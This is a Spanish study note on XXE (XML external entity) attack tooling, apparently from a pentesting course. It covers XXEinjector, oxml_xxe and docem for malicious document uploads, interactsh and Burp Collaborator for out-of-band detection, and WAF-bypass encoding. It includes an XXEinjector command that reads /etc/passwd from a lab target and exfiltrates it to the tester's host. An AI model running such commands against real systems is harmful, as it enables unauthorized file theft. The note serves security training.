---
tags:
  - Web/Red-Team
  - Pentesting/Explotacion
  - XXE
Fecha de actualización: 2026-07-15
Nota previa: "[[19 - Detección, evasión y prevención de XXE]]"
Nota siguiente: ""
Area: "[[Web Attacks.base|Web Attacks]]"
---
---

Arsenal para detectar y explotar XXE: exploitation automática, entrega vía ficheros (el vector moderno), y detección ciega con canales OOB. Cierra el módulo [[00 - Introducción a los Web Attacks|Web Attacks]].

# Explotación automática

## XXEinjector

<mark style="background: #ADCCFFA6;">La herramienta de referencia</mark> (Ruby, de enjoiz). Automatiza **todos** los métodos: básico, CDATA, error-based y OOB ciego, con `php://filter` incorporado. Guardas la petición de Burp en un fichero con el marcador `XXEINJECT` tras la primera línea del XML:

```http
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.201.94
Content-Type: text/plain;charset=UTF-8

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```

Y lo lanzas indicando el fichero a leer y el modo OOB:

```shell-session
$ ruby XXEinjector.rb --host=OUR_IP --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
```

Los ficheros exfiltrados quedan en `Logs/`. Soporta `--oob=http`, `--oob=ftp` (útil para datos largos sin límite de URL) y enumeración de directorios.

# Entrega vía ficheros (XXE moderno)

Como la superficie XXE hoy vive en subidas de documentos/imágenes ([[19 - Detección, evasión y prevención de XXE|detección]]), estas herramientas **inyectan el payload dentro** del fichero:

| Herramienta | Formatos | Uso |
| - | - | - |
| **oxml_xxe** | `DOCX`, `XLSX`, `PPTX`, `ODT`, `SVG`, `PDF`, `JPG`, `GIF` | Empotra el XXE en el XML interno del documento; ideal para funciones de "subir CV/avatar/factura" |
| **docem** | `docx`, `odt`, `pptx` | Inserta payloads XXE y XSS en documentos ofimáticos de forma masiva |

Flujo típico: generas un `.docx`/`.svg` malicioso con `oxml_xxe`, lo subes al objetivo y observas el callback OOB.

# Detección ciega (OOB)

- <mark style="background: #FFB86CA6;">**Burp Collaborator**</mark> (Burp Pro): genera dominios únicos y detecta callbacks DNS/HTTP del servidor víctima → confirma XXE ciego sin ver datos. Burp Scanner encadena automáticamente el XXE encontrado con el callback OOB para triaje rápido.
- **interactsh** (ProjectDiscovery): alternativa **open-source** a Collaborator. Levanta tu propio servidor de interacción o usa el público:

```shell-session
$ interactsh-client
# genera un dominio; úsalo en la entidad externa y observa los hits DNS/HTTP
```

- **Burp Scanner** (Pro): detecta XXE reflejado y ciego de forma automatizada; primer barrido en cualquier engagement.

# Payloads y encoding

- **PayloadsAllTheThings – XXE** y **payload-box/xxe-injection-payload-list**: colecciones de payloads (file read, SSRF, OOB, WAF bypass, por lenguaje).
- `iconv -f UTF-8 -t UTF-16BE payload.xml` para el [[19 - Detección, evasión y prevención de XXE|bypass de WAF por doble encoding]].
- **CyberChef** para montar/desmontar el `base64` de la exfiltración.

> [!tip]+ Flujo recomendado
> 1. **Detección**: Burp Scanner + Collaborator/interactsh sobre todos los endpoints que huelan a XML (y probar `Content-Type: application/xml` en los JSON). 2. **Superficie oculta**: subir un `.docx`/`.svg` de `oxml_xxe` en cada función de upload. 3. **Explotación reflejada**: manual o XXEinjector con `php://filter`/CDATA. 4. **Ciego**: XXEinjector `--oob` o payload OOB manual hacia interactsh. 5. **Sin salida a internet**: error-based con [[19 - Detección, evasión y prevención de XXE|reutilización de DTDs locales]].

Con esto cerramos el módulo **Web Attacks**. Los tres sub-temas —[[01 - Introducción a HTTP Verb Tampering|Verb Tampering]], [[06 - Introducción a IDOR|IDOR]] y [[14 - Introducción a XXE|XXE]]— comparten la misma lección: atacar el control de acceso y la configuración, no solo la sanitización de entrada.

## Referencias

- XXEinjector — [enjoiz/XXEinjector](https://github.com/enjoiz/XXEinjector)
- [oxml_xxe](https://github.com/BuffaloWill/oxml_xxe) · [docem](https://github.com/whitel1st/docem)
- ProjectDiscovery — [interactsh](https://github.com/projectdiscovery/interactsh)
- PortSwigger — [Testing for XXE with Burp](https://portswigger.net/burp/documentation/desktop/testing-workflow/input-validation/xxe-injection/testing)
- PayloadsAllTheThings — [XXE Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
